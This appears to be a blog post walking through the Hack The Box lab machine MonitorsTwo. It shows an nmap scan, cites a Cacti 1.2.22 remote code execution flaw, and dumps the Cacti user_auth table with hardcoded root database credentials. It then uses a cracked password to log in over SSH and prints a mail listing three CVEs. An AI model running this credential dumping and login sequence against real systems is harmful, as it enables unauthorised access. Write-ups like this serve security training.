---
layout: post
title: htb monitors two
date: 2023-05-02 09:22 +0200
---

```
HOST: 10.10.11.211
```

## Tools used

- [nmap](https://nmap.org/)

## What to do ?

- First we'll scan port with `nmap` to discover if was some it open
- Then we'll find a loophole and exploit it.

### Nmap Scan

```bash
┌──(rether㉿rether)-[~]
└─$ nmap -A 10.10.11.211
Nmap scan report for monitorstwo.htb (10.10.11.211)
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP - port 80

!["Monitors two home page"](/assets/img/posts/monitors-two/monitors-two-home.png "Monitors two home page")

This website use [cacti](https://github.com/Cacti/cacti#cacti-) 1.2.22 it is an operations framework. I found a [post](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/) explaining a vulnerability that allows remote code execution while unauthenticated in cacti version 1.2.22. And this gitub repo to understand how it works. I create my own [tool]() to exploit this vulnerabilitie.

When you are in it we see that we are in a Docker environment.
We see this through the `.dockerenv` file and this proper entry point file in the racine of the server.

```bash
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

The above script allows us to access the `cacti` database. As well as the table in which user passwords are stored (`user_auth`)
To display the data in this table, we simply execute this command:


```bash
mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"
```

```
id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_trees   policy_hosts     policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts lastfail        reset_perms
1       admin           $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb           on      on      on      on      on      2       1       1       1       1       on      -1     -1       -1              0       0       663348655
3       guest           43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1      -1      -1              0       0       0
4       marcus          $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on      1       1       1       1       1       on      -1     -1               on      0       0       2135691668

```

We got the above information
A marcus user and this password

user/password: marcus / $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
marcus/funkymonkey


```bash
┌──(rether㉿rether)-[~/Documents/HTB/machines/MonitorsTwo]
└─$ ssh marcus@10.10.11.211
marcus@10.10.11.211's password:
[...]
marcus@monitorstwo:~$
```

In this path `/var/mail/marcus` we find a file

```

From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```
